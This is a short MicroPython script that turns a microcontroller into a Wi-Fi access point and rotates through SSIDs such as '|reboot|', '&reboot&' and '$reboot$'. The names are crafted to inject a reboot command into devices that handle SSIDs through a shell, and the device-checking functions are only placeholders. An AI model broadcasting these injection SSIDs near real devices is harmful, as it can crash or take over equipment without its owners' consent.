import network
import time
import machine

# SSID configurations
ssids = ["|reboot|", "&reboot&", "reboot", "$reboot$"]
password = "12345678"
ssid_index = 0
total_ssids = len(ssids)

# Time intervals
ssid_change_interval = 2 * 60  # 2 minutes in seconds
check_interval = 60  # 1 minute in seconds

# Setup Wi-Fi in AP mode
ap = network.WLAN(network.AP_IF)
ap.active(True)

def change_ssid():
    global ssid_index
    new_ssid = ssids[ssid_index]
    ap.config(essid=new_ssid, password=password)
    print("Changed SSID to:", new_ssid)
    ssid_index = (ssid_index + 1) % total_ssids

def list_and_check_connected_devices():
    # List connected devices
    # Note: MicroPython might not support listing connected devices directly
    # Placeholder for network test
    print("Checking connected devices...")

def perform_network_test(ip_address):
    # Placeholder function for network test
    # Implement your network testing logic here
    return False  # Return true if vulnerable, false if safe

# Main loop
last_change = time.time()
last_check = time.time()

while True:
    current_time = time.time()

    if current_time - last_change >= ssid_change_interval:
        last_change = current_time
        change_ssid()

    if current_time - last_check >= check_interval:
        last_check = current_time
        list_and_check_connected_devices()

    # Sleep to prevent excessive CPU usage
    time.sleep(1)
